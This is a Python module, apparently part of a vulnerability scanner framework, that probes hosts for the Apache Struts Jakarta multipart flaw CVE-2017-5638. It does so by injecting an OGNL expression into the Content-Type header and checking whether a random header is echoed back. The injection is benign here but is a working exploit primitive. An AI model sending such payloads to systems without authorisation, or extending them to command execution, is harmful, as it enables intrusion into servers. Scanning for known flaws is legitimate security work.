#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Pradeep Jairamani , github.com/pradeepjairamani

import socket
import socks
import time
import json
import threading
import string
import random
import sys
import struct
import re
import os
from OpenSSL import crypto
import ssl
from core.alert import *
from core.targets import target_type
from core.targets import target_to_host
from core.load_modules import load_file_path
from lib.socks_resolver.engine import getaddrinfo
from core._time import now
from core.log import __log_into_file
import requests
from core.decor import socks_proxy, main_function
from core.conn import connection

def extra_requirements_dict():
    return {
        "struts_vuln_ports": [80, 443]
    }





def apache_struts(target, port, timeout_sec, log_in_file, language, time_sleep,
                  thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
    try:
        s = connection(target, port, timeout_sec, socks_proxy)
        if not s:
            return False
        else:
            if target_type(target) != "HTTPS" and port == 443: # type == "HTTPS".
                target = 'https://' + target
            if target_type(target) != "HTTP" and port == 80:
                target = 'http://' + target
            random_string = ''.join(random.choice(
                'abcdefghijklmnopqrstuvwxyz') for i in range(7))
            payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
            payload += "addHeader('%s','%s')}.multipart/form-data" % (
                random_string, random_string)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
                'Content-Type': str(payload),
                'Accept': '*/*'
            }
            timeout = 3
            resp = requests.get(
                target, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
            if ((random_string in list(resp.headers.keys())) and (resp.headers[random_string] == random_string)):
                return True
            else:
                return False
    except Exception as e:
        # some error warning
        return False


def __apache_struts(target, port, timeout_sec, log_in_file, language, time_sleep,
                    thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
    if apache_struts(target, port, timeout_sec, log_in_file, language, time_sleep,
                     thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
        info(messages(language, "target_vulnerable").format(target, port,
                                                            'The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string. CVE-2017-5638'))
        __log_into_file(thread_tmp_filename, 'w', '0', language)
        data = json.dumps({'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': port, 'TYPE': 'apache_struts_vuln',
                           'DESCRIPTION': messages(language, "vulnerable").format(''), 'TIME': now(),
                           'CATEGORY': "vuln",
                           'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
        __log_into_file(log_in_file, 'a', data, language)
        return True
    else:
        return False

@main_function(extra_requirements_dict(), __apache_struts, "apache_struts_vuln", "Apache Struts CVE-2017-5638")
def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep, language,
          verbose_level, socks_proxy, retries, methods_args, scan_id, scan_cmd):  # Main function
    pass